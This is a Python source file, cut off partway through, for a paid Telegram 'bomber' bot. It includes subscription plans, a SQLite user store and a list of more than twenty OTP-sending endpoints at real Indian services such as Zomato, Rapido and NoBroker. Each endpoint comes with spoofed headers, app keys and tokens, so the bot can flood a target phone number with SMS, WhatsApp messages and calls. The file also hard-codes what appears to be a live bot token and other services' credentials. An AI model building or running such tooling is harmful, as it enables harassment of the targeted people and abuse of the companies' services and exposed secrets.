import sys
import types
import ssl
import re
import os
import json
import logging
import asyncio
import aiohttp
import time
import random
import string
import signal
from datetime import datetime, timedelta

# ========== SQLITE / AIOSQLITE IMPORTS ==========
import aiosqlite
import sqlite3

# ========== LOGGING SETUP ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== CGI MODULE FIX FOR PYTHON 3.13+ ==========
class CGI:
    def parse_multipart(self, *args, **kwargs):
        return {}
    
    class FieldStorage:
        def __init__(self, *args, **kwargs):
            self.value = None
            self.filename = None
            self.file = None
            self.type = None
            self.headers = {}
        
        def __getattr__(self, name):
            return None

cgi_module = types.ModuleType('cgi')
cgi_module.parse_multipart = CGI().parse_multipart
cgi_module.FieldStorage = CGI.FieldStorage
cgi_module.__dict__.update({
    'parse_multipart': CGI().parse_multipart,
    'FieldStorage': CGI.FieldStorage
})
sys.modules['cgi'] = cgi_module

# ========== HTTPX COMPLETE COMPATIBILITY FIX FOR PYTHON 3.13+ ==========
import httpx
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)

_original_async_client_init = httpx.AsyncClient.__init__

def _patched_async_client_init(self, *args, **kwargs):
    deprecated_params = ['proxy', 'proxies', 'http1', 'http2', 'verify', 'cert', 'trust_env']
    
    for param in deprecated_params:
        if param in kwargs:
            if param == 'proxy' or param == 'proxies':
                if 'proxies' not in kwargs and 'proxy' in kwargs:
                    kwargs['proxies'] = kwargs.pop('proxy')
                elif 'proxy' in kwargs:
                    kwargs.pop('proxy')
                if 'proxies' in kwargs and kwargs['proxies'] is None:
                    kwargs.pop('proxies')
            else:
                kwargs.pop(param, None)
    
    try:
        _original_async_client_init(self, *args, **kwargs)
    except TypeError as e:
        if 'unexpected keyword' in str(e):
            clean_kwargs = {}
            allowed_params = ['timeout', 'proxies', 'limits', 'max_redirects', 'follow_redirects']
            for param in allowed_params:
                if param in kwargs:
                    clean_kwargs[param] = kwargs[param]
            _original_async_client_init(self, *args, **clean_kwargs)
        else:
            raise

httpx.AsyncClient.__init__ = _patched_async_client_init

_original_async_client_del = getattr(httpx.AsyncClient, '__del__', None)

def _patched_async_client_del(self):
    try:
        if hasattr(self, '_state'):
            if _original_async_client_del:
                _original_async_client_del(self)
    except (AttributeError, TypeError):
        pass

if _original_async_client_del:
    httpx.AsyncClient.__del__ = _patched_async_client_del

_original_client_init = httpx.Client.__init__

def _patched_client_init(self, *args, **kwargs):
    deprecated_params = ['proxy', 'proxies', 'http1', 'http2', 'verify', 'cert', 'trust_env']
    for param in deprecated_params:
        if param in kwargs:
            if param == 'proxy' or param == 'proxies':
                if 'proxies' not in kwargs and 'proxy' in kwargs:
                    kwargs['proxies'] = kwargs.pop('proxy')
                elif 'proxy' in kwargs:
                    kwargs.pop('proxy')
                if 'proxies' in kwargs and kwargs['proxies'] is None:
                    kwargs.pop('proxies')
            else:
                kwargs.pop(param, None)
    try:
        _original_client_init(self, *args, **kwargs)
    except TypeError:
        clean_kwargs = {}
        allowed_params = ['timeout', 'proxies', 'limits', 'max_redirects', 'follow_redirects']
        for param in allowed_params:
            if param in kwargs:
                clean_kwargs[param] = kwargs[param]
        _original_client_init(self, *args, **clean_kwargs)

httpx.Client.__init__ = _patched_client_init
# ====================================================

from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

# ========== VPS ENVIRONMENT VARIABLES ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8495053693:AAH28HAuqT_b5jtshK3UKweTpH5dnVgCXPo")
OWNER_ID = int(os.environ.get("OWNER_ID", 8128821116))
ADMIN_ID = int(os.environ.get("ADMIN_ID", 8128821116))
WELCOME_IMAGE = os.environ.get("WELCOME_IMAGE", "https://kommodo.ai/i/wqVc4u68cErtebyE6okA")
PORT = int(os.environ.get("PORT", 8080))
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
USE_WEBHOOK = os.environ.get("USE_WEBHOOK", "false").lower() == "true"
DB_PATH = os.environ.get("DB_PATH", os.path.join(os.path.dirname(os.path.abspath(__file__)), "rolexbomber.db"))

PLANS = {
    "standard": {"name": "Standard", "price": 149, "days": 30, "concurrent": 2, "max_duration": 300},
    "premium": {"name": "Premium", "price": 249, "days": 30, "concurrent": 5, "max_duration": 720},
    "ultimate": {"name": "Ultimate", "price": 349, "days": 30, "concurrent": 10, "max_duration": 720}
}

# ========== SQLITE STORAGE CLASS ==========
class SqliteStorage:
    def __init__(self, db_path):
        self.db_path = db_path
        self._conn = None
        self.temp_attack_data = {}
        d = os.path.dirname(os.path.abspath(db_path))
        if d and not os.path.exists(d):
            os.makedirs(d, exist_ok=True)
        logger.info(f"✅ SQLite storage initialized: {db_path}")

    async def _connect(self):
        if self._conn is None:
            self._conn = await aiosqlite.connect(self.db_path)
            self._conn.row_factory = sqlite3.Row
        return self._conn

    async def _exec(self, sql, params=()):
        conn = await self._connect()
        cur = await conn.execute(sql, params)
        await conn.commit()
        return cur

    async def _fetchone(self, sql, params=()):
        conn = await self._connect()
        cur = await conn.execute(sql, params)
        row = await cur.fetchone()
        await cur.close()
        return row

    async def _fetchall(self, sql, params=()):
        conn = await self._connect()
        cur = await conn.execute(sql, params)
        rows = await cur.fetchall()
        await cur.close()
        return rows

    async def ensure_indexes(self):
        conn = await self._connect()
        await conn.execute(
            "CREATE TABLE IF NOT EXISTS users ("
            " user_id INTEGER PRIMARY KEY,"
            " premium_expiry TEXT,"
            " premium_plan TEXT DEFAULT 'standard',"
            " protected_number TEXT,"
            " created_at TEXT)"
        )
        await conn.execute(
            "CREATE TABLE IF NOT EXISTS redeem_codes ("
            " code TEXT PRIMARY KEY,"
            " days INTEGER,"
            " plan_type TEXT,"
            " is_used INTEGER DEFAULT 0,"
            " created_at TEXT)"
        )
        await conn.execute(
            "CREATE TABLE IF NOT EXISTS settings ("
            " key TEXT PRIMARY KEY,"
            " value TEXT)"
        )
        await conn.commit()
        logger.info("✅ SQLite tables created!")

    async def get_user(self, user_id):
        row = await self._fetchone("SELECT * FROM users WHERE user_id = ?", (int(user_id),))
        if row is None:
            return None
        return dict(row)

    async def add_user(self, user_id):
        existing = await self.get_user(user_id)
        if not existing:
            try:
                await self._exec(
                    "INSERT INTO users (user_id, premium_expiry, premium_plan, protected_number, created_at) VALUES (?,?,?,?,?)",
                    (int(user_id), None, "standard", None, datetime.now().isoformat())
                )
                logger.info(f"✅ New user added: {user_id}")
            except Exception:
                pass
        return True

    async def is_premium(self, user_id):
        if user_id == OWNER_ID:
            return True
        user = await self.get_user(user_id)
        if user and user.get("premium_expiry"):
            try:
                expiry = datetime.fromisoformat(user["premium_expiry"])
                return datetime.now() < expiry
            except Exception:
                return False
        return False

    async def get_concurrent_limit(self, user_id):
        if user_id == OWNER_ID:
            return 10
        user = await self.get_user(user_id)
        if user and user.get("premium_expiry"):
            try:
                expiry = datetime.fromisoformat(user["premium_expiry"])
                if datetime.now() < expiry:
                    plan = user.get("premium_plan", "standard")
                    return PLANS.get(plan, PLANS["standard"])["concurrent"]
            except Exception:
                pass
        return 0

    async def get_max_duration(self, user_id):
        if user_id == OWNER_ID:
            return 720
        user = await self.get_user(user_id)
        if user and user.get("premium_expiry"):
            try:
                expiry = datetime.fromisoformat(user["premium_expiry"])
                if datetime.now() < expiry:
                    plan = user.get("premium_plan", "standard")
                    return PLANS.get(plan, PLANS["standard"])["max_duration"]
            except Exception:
                pass
        return 0

    async def get_plan_name(self, user_id):
        if user_id == OWNER_ID:
            return "Ultimate"
        user = await self.get_user(user_id)
        if user and user.get("premium_expiry"):
            try:
                expiry = datetime.fromisoformat(user["premium_expiry"])
                if datetime.now() < expiry:
                    plan = user.get("premium_plan", "standard")
                    return PLANS.get(plan, PLANS["standard"])["name"]
            except Exception:
                pass
        return "Free"

    async def get_expiry(self, user_id):
        user = await self.get_user(user_id)
        if user and user.get("premium_expiry"):
            try:
                expiry = datetime.fromisoformat(user["premium_expiry"])
                if datetime.now() < expiry:
                    return user["premium_expiry"]
            except Exception:
                pass
        return "Not Active"

    async def add_premium(self, user_id, days, plan_type="standard"):
        current = datetime.now()
        user = await self.get_user(user_id)
        if user and user.get("premium_expiry"):
            try:
                stored = datetime.fromisoformat(user["premium_expiry"])
                if stored > current:
                    current = stored
            except Exception:
                pass
        new_exp = current + timedelta(days=days)
        str_exp = new_exp.isoformat()
        await self._exec(
            "INSERT INTO users (user_id, premium_expiry, premium_plan, protected_number, created_at)"
            " VALUES (?, ?, ?, NULL, ?)"
            " ON CONFLICT(user_id) DO UPDATE SET"
            " premium_expiry=excluded.premium_expiry, premium_plan=excluded.premium_plan",
            (int(user_id), str_exp, plan_type, datetime.now().isoformat())
        )
        return str_exp

    async def generate_code(self, days, plan_type="standard"):
        code = "PREMIUM-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        existing = await self._fetchone("SELECT code FROM redeem_codes WHERE code = ?", (code,))
        if existing:
            return await self.generate_code(days, plan_type)
        await self._exec(
            "INSERT INTO redeem_codes (code, days, plan_type, is_used, created_at) VALUES (?,?,?,?,?)",
            (code, days, plan_type, 0, datetime.now().isoformat())
        )
        return code

    async def redeem(self, user_id, code):
        row = await self._fetchone("SELECT * FROM redeem_codes WHERE code = ?", (code,))
        if not row:
            return False, 0, None, None
        if row["is_used"] == 1:
            return False, 0, None, None
        days = row["days"] or 0
        plan_type = row["plan_type"] or "standard"
        await self._exec("UPDATE redeem_codes SET is_used = 1 WHERE code = ?", (code,))
        exp_date = await self.add_premium(user_id, days, plan_type)
        return True, days, plan_type, exp_date

    async def protect(self, user_id, number):
        await self._exec("UPDATE users SET protected_number = ? WHERE user_id = ?", (number, int(user_id)))

    async def unprotect(self, user_id):
        await self._exec("UPDATE users SET protected_number = NULL WHERE user_id = ?", (int(user_id),))

    async def is_protected(self, number):
        row = await self._fetchone("SELECT user_id FROM users WHERE protected_number = ?", (number,))
        return row is not None

    async def set_channel(self, channel_id):
        await self._exec(
            "INSERT INTO settings (key, value) VALUES ('channel_id', ?)"
            " ON CONFLICT(key) DO UPDATE SET value = excluded.value",
            (str(channel_id),)
        )

    async def get_channel(self):
        row = await self._fetchone("SELECT value FROM settings WHERE key = 'channel_id'")
        if row and row["value"]:
            return str(row["value"])
        return None

    async def remove_channel(self):
        await self._exec("DELETE FROM settings WHERE key = 'channel_id'")

    async def get_all_users(self):
        rows = await self._fetchall("SELECT user_id FROM users")
        return [r["user_id"] for r in rows]

    async def get_stats(self):
        total_users = (await self._fetchone("SELECT COUNT(*) AS c FROM users"))["c"]
        now = datetime.now().isoformat()
        premium_users = (await self._fetchone("SELECT COUNT(*) AS c FROM users WHERE premium_expiry > ?", (now,)))["c"]
        total_codes = (await self._fetchone("SELECT COUNT(*) AS c FROM redeem_codes"))["c"]
        return total_users, premium_users, total_codes

    def set_attack_data(self, user_id, targets):
        self.temp_attack_data[user_id] = {'targets': targets, 'timestamp': time.time()}

    def get_attack_data(self, user_id):
        data = self.temp_attack_data.get(user_id)
        if data and time.time() - data['timestamp'] < 300:
            return data['targets']
        if user_id in self.temp_attack_data:
            del self.temp_attack_data[user_id]
        return None

    def clear_attack_data(self, user_id):
        if user_id in self.temp_attack_data:
            del self.temp_attack_data[user_id]

    async def close(self):
        if self._conn is not None:
            await self._conn.close()
            self._conn = None

db = None

# ========== COMPLETE API LIST (92+ APIs) ==========
def build_api_list():
    apis = []
    
    # ========== ORIGINAL APIS (1-80) ==========
    
    # 1. NoBroker - SMS
    apis.append({
        "name": "NoBroker_SMS",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001; wv) AppleWebKit/537.36",
            "Origin": "https://www.nobroker.in",
            "Referer": "https://www.nobroker.in/"
        },
        "body": {"phone": "{no}", "countryCode": "IN"}
    })
    
    # 2. Housing - WhatsApp
    apis.append({
        "name": "Housing_WhatsApp",
        "url": "https://mightyzeus-mum.housing.com/api/gql",
        "method": "POST",
        "params": {"apiName": "LOGIN_SEND_OTP_API", "emittedFrom": "client_buy_home", "isBot": "false", "platform": "mobile", "source": "mobile", "source_name": "AudienceWeb"},
        "headers": {
            "phoenix-api-name": "LOGIN_SEND_OTP_API",
            "app-name": "mobile_web_buyer",
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"query": "mutation($phone: String, $userAgent: String, $otpLength: Int, $preference: String) { sendOtp(phone: $phone, userAgent: $userAgent, otpLength: $otpLength, preference: $preference) { success message } }", "variables": {"phone": "{no}", "userAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", "otpLength": 4, "preference": "whatsapp"}}
    })
    
    # 3. Housing - SMS
    apis.append({
        "name": "Housing_SMS",
        "url": "https://mightyzeus-mum.housing.com/api/gql",
        "method": "POST",
        "params": {"apiName": "LOGIN_SEND_OTP_API", "emittedFrom": "client_buy_home", "isBot": "false", "platform": "mobile", "source": "mobile", "source_name": "AudienceWeb"},
        "headers": {
            "phoenix-api-name": "LOGIN_SEND_OTP_API",
            "app-name": "mobile_web_buyer",
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"query": "mutation($phone: String, $userAgent: String, $otpLength: Int) { sendOtp(phone: $phone, userAgent: $userAgent, otpLength: $otpLength) { success message } }", "variables": {"phone": "{no}", "userAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", "otpLength": 4}}
    })
    
    # 4. Zomato - SMS
    apis.append({
        "name": "Zomato_SMS",
        "url": "https://accounts.zomato.com/login/phone",
        "method": "POST",
        "headers": {
            "Host": "accounts.zomato.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "x-zomato-api-key": "7749b19667964b87a3efc739e254ada2",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)"
        },
        "body": {"number": "{no}", "country_id": "1", "lc": "bed7238d427f41e7a34ea6ea134d2628", "type": "initiate", "verification_type": "sms", "package_name": "com.application.zomato", "message_uuid": ""}
    })
    
    # 5. Zomato - Call
    apis.append({
        "name": "Zomato_Call",
        "url": "https://accounts.zomato.com/login/phone",
        "method": "POST",
        "headers": {
            "Host": "accounts.zomato.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "x-zomato-api-key": "7749b19667964b87a3efc739e254ada2",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)"
        },
        "body": {"number": "{no}", "country_id": "1", "lc": "bed7238d427f41e7a34ea6ea134d2628", "type": "initiate", "verification_type": "call", "package_name": "", "message_uuid": "sms-service-v2-12cf2bdc-7cd9-4e1a-9cd1-6470f83d56f0"}
    })
    
    # 6. Zomato - WhatsApp
    apis.append({
        "name": "Zomato_WhatsApp",
        "url": "https://accounts.zomato.com/login/phone",
        "method": "POST",
        "headers": {
            "Host": "accounts.zomato.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "x-zomato-api-key": "7749b19667964b87a3efc739e254ada2",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)"
        },
        "body": {"number": "{no}", "country_id": "1", "lc": "af07c17656e641efbfcc489f51aea946", "type": "initiate", "verification_type": "whatsapp", "package_name": "", "message_uuid": ""}
    })
    
    # 7. Refyne - SMS
    apis.append({
        "name": "Refyne_SMS",
        "url": "https://prod-api.refyne.co.in/auth/v3/send-otp",
        "method": "POST",
        "headers": {
            "Host": "prod-api.refyne.co.in",
            "Content-Type": "application/json",
            "Authorization": "Bearer",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)"
        },
        "body": {"channel": "SMS", "recipient": "{no}"}
    })
    
    # 8. Refyne - Call
    apis.append({
        "name": "Refyne_Call",
        "url": "https://prod-api.refyne.co.in/auth/v3/send-otp",
        "method": "POST",
        "headers": {
            "Host": "prod-api.refyne.co.in",
            "Content-Type": "application/json",
            "Authorization": "Bearer",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)"
        },
        "body": {"channel": "IVR", "recipient": "{no}"}
    })
    
    # 9. Refyne - WhatsApp
    apis.append({
        "name": "Refyne_WhatsApp",
        "url": "https://prod-api.refyne.co.in/auth/v3/send-otp",
        "method": "POST",
        "headers": {
            "Host": "prod-api.refyne.co.in",
            "Content-Type": "application/json",
            "Authorization": "Bearer",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)"
        },
        "body": {"channel": "WHATSAPP", "recipient": "{no}"}
    })
    
    # 10. Rapido
    apis.append({
        "name": "Rapido_GenerateOTP",
        "url": "https://customer.rapido.bike/api/customer/v2/generateOtp",
        "method": "POST",
        "headers": {
            "Host": "customer.rapido.bike",
            "Content-Type": "application/json",
            "aid": "g4dv8FPtw4P87hPSEncuIH4gtlj4Ei2l+O0LSGvIr0M=",
            "accept": "application/json",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)"
        },
        "body": {"deviceDetails": {"androidId": "", "appId": "2", "deviceId": "13d0b5bd46e271ca", "firebaseToken": "cejGtzeATDCDAjgxrdjMpG", "manufacturer": "google", "model": "Pixel 4", "timeStamp": "0", "firebaseAppInstanceId": "8a36cb89a513fac0eaac67b9bb716f2f"}, "mobile": "{no}"}
    })
    
    # 11. Rapido - WhatsApp Resend
    apis.append({
        "name": "Rapido_WhatsApp_Resend",
        "url": "https://customer.rapido.bike/api/customer/whatsApp/v2/resendOtp",
        "method": "PUT",
        "headers": {
            "Host": "customer.rapido.bike",
            "Content-Type": "application/json",
            "aid": "g4dv8FPtw4P87hPSEncuIH4gtlj4Ei2l+O0LSGvIr0M=",
            "accept": "application/json",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)"
        },
        "body": {"mobile": "{no}"}
    })
    
    # 12. EazyDiner - SMS
    apis.append({
        "name": "EazyDiner_SMS",
        "url": "https://force.eazydiner.com/4.1/otp?medium=android",
        "method": "POST",
        "headers": {
            "Host": "force.eazydiner.com",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Authorization": "Bearer",
            "manual-location": "true",
            "Screen-Width": "720",
            "Build": "378",
            "Medium": "Android",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)"
        },
        "body": {"mobile": "+{no}"}
    })
    
    # 13. EazyDiner - WhatsApp
    apis.append({
        "name": "EazyDiner_WhatsApp",
        "url": "https://force.eazydiner.com/4.1/otp?medium=android",
        "method": "POST",
        "headers": {
            "Host": "force.eazydiner.com",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Authorization": "Bearer",
            "manual-location": "true",
            "Screen-Width": "720",
            "Build": "378",
            "Medium": "Android",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)"
        },
        "body": {"mobile": "+{no}", "whatsapp": "1"}
    })
    
    # 14. GoMechanic
    apis.append({
        "name": "GoMechanic",
        "url": "https://gomechanic.app/api/v2/send_otp",
        "method": "POST",
        "headers": {
            "Host": "gomechanic.app",
            "Content-Type": "application/json; charset=UTF-8",
            "g-api": "jnjndi478fdnf",
            "sdkversion": "28",
            "ostype": "android",
            "deviceID": "6b054291b6c31d47",
            "country": "IN",
            "devicebrand": "google",
            "devicemodel": "Pixel 4",
            "appversion": "3.0.8",
            "appcode": "313",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)"
        },
        "body": {"hash": "cfN9tRcI8/y", "number": "{no}", "random_id": "5f2ue", "token": "c8b9b119701c5668829cd6acc8aa053bcf1003f6642a55f0a39a80db905f24d1"}
    })
    
    # 15. IndustryBuying
    apis.append({
        "name": "IndustryBuying",
        "url": "https://api.industrybuying.com/api/users/action",
        "method": "POST",
        "headers": {
            "Host": "api.industrybuying.com",
            "Content-Type": "application/json",
            "x-forward-to": "node",
            "x-ib-token": "",
            "x-ib-client": "ANDROID",
            "x-ib-client-version": "11.0.11",
            "x-ib-client-version-code": "427",
            "x-ib-client-name": "Pixel 4",
            "accept": "application/json",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)"
        },
        "body": {"pageUri": "/user/register?loginId=", "moduleType": "USERS", "requestType": "ACTION", "pageType": "USER", "userContext": {"action": "VERIFY_USER", "payload": {"loginId": "{no}", "isLoginModule": False, "businessIdentificationVerified": False, "emailId": "temp@gmail.com", "fullName": "temp", "ibCredit": True, "mobileNo": "{no}", "mobileNoVerified": False}, "url": None}, "shouldHardReload": True}
    })
    
    # 16. Badho Initiate
    apis.append({
        "name": "Badho_Initiate",
        "url": "https://auth.badho.in/api/authentication/initiate",
        "method": "POST",
        "headers": {
            "Host": "auth.badho.in",
            "Content-Type": "application/json",
            "accept": "application/json",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)"
        },
        "body": {"env": "production", "platform": "android", "phoneNumber": "{no}", "appName": "buyer", "token": "0cAFcWeA797B78eeflCRX-9LAycLJYX3SrlpHdLT3KmxtpyM5QaQNY2DcuPKuENYDro7TzO1ulAh6JrUpGKhWAYAWdafRAA_LNvc1LCi9zOk3m7Ft1ERO0m06v0amVG6--Aw1cqF6LHyhSIvru_jtJA8l-U2GnqSgOIDcdhryhDMZNhEyq-bY1Dur1hc7hR64p1NWHemiemLju2-tBj673DvYXfgGQNSJkdIb7yglQO1TewFGvWYwBUW-FWuqXGtKsreBk8ZA7Vn2ryGpUHBde5cuR5I6nM8SWoP1yDZFnRIqcI_6laCzH0sUD0Jdmhy-pkrvT9tn57KPX-q9CHzFDXJMbNmij8fngN9uYAgEkcBPXde-AO_w7PLWQrSTmKJkjM_69vot9AgFqnhmWVkKg1oMH42an6fP9W_vtYvOtJfNFULiH1Ptr98SftdZJMeRLlwySOwkHmXb0ctKcn696c7RBrDrktnQoxf15aYRZ9ncI-s-rNCU3HoMMdlTsIntvfJMZR7MKsAjI7JSM0yCkNwGgScmrA6Z9NRuO5SqVm_o-xndu-kp_K_iufLC1UVxlPvVNTHrfjmsBtviPQ7IxqDx-KSihdpiEAa6Fw31aWZfHrtkagsTf7SKeTBRhUXRoSWJHUJS9Q-NG0ksy76o6fxN2oKqp3Xd-SXFyB_fhbAgUkGjJau67rl_iWR6amlBY6wdTdMZxjLRYvTpLgs2y4r1uHfhu0-05aveYyE_5VOu7mWIu2FeWX3x0vA3X1801NgA-jKEVtlSiHGoFRut6Pytl8vkVi8LdIyeURu2_y8HM0pPTWzOH0MnFlkb8sqXhC5-3FHtBfsg7qK7f-6G8ZOPVOCgupc_XBnZyrKhv9vVRswE7QjvS3qUfmC6lzhHiWr1lOadk_8NDES62GsYXYkHPZiTKvB4iqeEPXIPzVfkIIlTe6EVz2Q9dnhZu7FVjNbFFIUiP9AH80uoQZ_F8A9Tbka3RweabgNBpt2ZMgzi4kSY2HN_iKf2MXy5ss3BQiYtPIPhQyzStvRZdYoKmViLJir_mkRDbGXSD2JEuL1j0fpyHlJ6Uenhdv5rTDb5xkZyLJ0ZLxK_4dWXmoAN2wSeCcn1hSTcDv1xwOIW0LCgag6NiwG85g7_ckr1bUpZZ_1RP8pcLj627tY3S0vy6nlTbkdBUAxbrl2Z2Eb6rBHNN0metAujE5R0306iyZvCifccyqrSjAaDe6K_-DJkfWtKAA9RUZq-vc0LX8kihlFo9OjzO4-RyCx6cq1U1R6RqjEc8Wf-NUco9DCN41u2XhYDLmo6C5V3p0Dr2haPg8sbafQ2Owh1I7BiG-euwd4QRetkxryerZPVxBu-TRHOdprTZV7ILyDufBMjfFMRuGku_-HQDth3qwr_DUWE_qFR_oZofN3SVpzQXx3vddZCFoOvTPsUP4TfrsbDty5a2a0zL1Kkbq5GM7R2lwoLLAKhdV6CHUI0D2z4bMudAR-dkWg_oqB2kd3gj0qX9yH1aHhum1OWnrv4a48N3pVBw9gtgw4zCVcC_fb6bi0xYalzWzSZoHuLFQczujn2g20k_YghKma2pnG4lnyo71aICoAIvsx56Ygic0kU8XFamCjzIc7t2huOWHrGO1G0jI2NoCRSQDbrfUef-AWafr-Fk0K4msQNPjm4y9yNe1bkNydxVMRZvFgh2h5G1kh0_omx45NfA6Ix8Yjtq5DqRP9kxbKss4AhoLPL1cW1ChuPgGG3LaAjqxFqEN5eO8-gc3UVr8nX0anoxszXXrTfPsZnCxe0FkEvVhhHjjm--xA0scnB1Vv1QuhVGtT2qEWJw67LoaIR7xMyAFFOILv0m2k7dk2pYLIak4Nb2F2AmpmS_aEcapPYM_-ZfeZAUXJiJImd53bQb8nOzYpLLHLNJliV_hYoJLHllmy0SyGw4H4yWVIBmLcP_ECkn3eTr2O7RIoRlxfRJ7LRWCd7MmmyQZTUeFDuVfQhOUlkbhscZ3Z6l6Yj9gCX4IcF2SukN_PAkogFOKKS9hyERIHq9JmfP5ohIV_AnKt8gKqd2LZ6Huqiz7WZJbgxil_kyCu6wY29ygTXCk4bOWn-iFEbVYJ86czmhmLimBpFZOwtj1ZnixaODD0CbpIkbilcpGSldyE2m6iqUttXOOOjvkCh8dxyLsOt9-IJG2sO-eFno8Ue7d_aSNVhSjzahCl82_1O8EbQ6wNSP1c7dKdSkLguPGf_I0Lm7YOg_tQMbyRNNLz15KsPpKnyiKlQ1dp3T5DYZ34auLsvwtQBhvyKQclevsp19xxX-Cn162Gj8UWGU2YkAuvEoBivSJrclhBxIqhgeTkZQXhvT2FHfGb4QWpzlneKNsAj7muOcqs3byLS9zM61tUq8cFv1tBXjhE4hOmVCW7ie9Z1nRhYuCx8kOrlAXoOQm5D-oPKQNw865cckmzOBeOqpVaZQ_BtSZS10PTcbkzqmwxJhLSeTxMeIoT5eH4dxHe8DdTJSesNUH3R6i_M2nWiAH0C0msphiKTgcx0kumN7u3vJmoiwpVs-OubRV2w-HJ4G10utRGLwu34kmFavxgPolGFid0hUF1KHY8hVGL0pBGwX7mOpTpt65s6Z3AU", "appId": "2391550b-7f93-4b02-8043-60a8646ec4f4", "contextToken": None, "otpHashCode": "vkfCtgDqUPU"}
    })
    
    # 17. Badho Call
    apis.append({
        "name": "Badho_Call",
        "url": "https://auth.badho.in/api/authentication/send-otp-via-phone-call",
        "method": "POST",
        "headers": {
            "Host": "auth.badho.in",
            "Content-Type": "application/json",
            "accept": "application/json",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)"
        },
        "body": {"contextToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJPVFBFbnRyeUlkIjoiM2I2NWJjNjgtMWYwOC00M2E2LWJlMGUtMDE3Mjk4NDk0YzNkIiwiaWF0IjoxNzU3NjY2OTMwLCJleHAiOjE3NjAyNTg5MzB9.0IWP-jXL-msPIuVlKoCd7U1dyMEEZDMPidaZMDzl9VY", "phoneNumber": "{no}", "appName": "buyer"}
    })
    
    # 18. Urbanic - SMS
    apis.append({
        "name": "Urbanic_SMS",
        "url": "https://api-shop-in.urbanic.com/n/api/buyer/basic/otp/sendCode",
        "method": "POST",
        "headers": {
            "Host": "api-shop-in.urbanic.com",
            "Content-Type": "application/json; charset=UTF-8",
            "app_version": "8.41.0.0",
            "client_type": "android-app",
            "x-platform": "android",
            "x-device": "google, Pixel 4",
            "x-os-version": "9",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)"
        },
        "body": {"bizTraceId": "be35ec943fee4d58a32727b2adfe9f9f", "channel": 1, "phonePrefix": "+91", "type": 0, "userName": "{no}"}
    })
    
    # 19. Urbanic - WhatsApp
    apis.append({
        "name": "Urbanic_WhatsApp",
        "url": "https://api-shop-in.urbanic.com/n/api/buyer/basic/otp/sendCode",
        "method": "POST",
        "headers": {
            "Host": "api-shop-in.urbanic.com",
            "Content-Type": "application/json; charset=UTF-8",
            "app_version": "8.41.0.0",
            "client_type": "android-app",
            "x-platform": "android",
            "x-device": "google, Pixel 4",
            "x-os-version": "9",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)"
        },
        "body": {"bizTraceId": "be35ec943fee4d58a32727b2adfe9f9f", "channel": 2, "phonePrefix": "+91", "type": 0, "userName": "{no}"}
    })
    
    # 20. Spinny
    apis.append({
        "name": "Spinny",
        "url": "https://api.spinny.com/api/c/user/otp-request/",
        "method": "POST",
        "headers": {
            "Host": "api.spinny.com",
            "Content-Type": "application/json",
            "platform": "app_android",
            "accept": "application/json, text/plain, */*",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)"
        },
        "body": {"contact_number": "{no}", "whatsapp": False, "code_len": 4}
    })
    
    # 21. AstroYogi - Generate OTP
    apis.append({
        "name": "AstroYogi_GenerateOtp",
        "url": "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3",
        "method": "POST",
        "headers": {
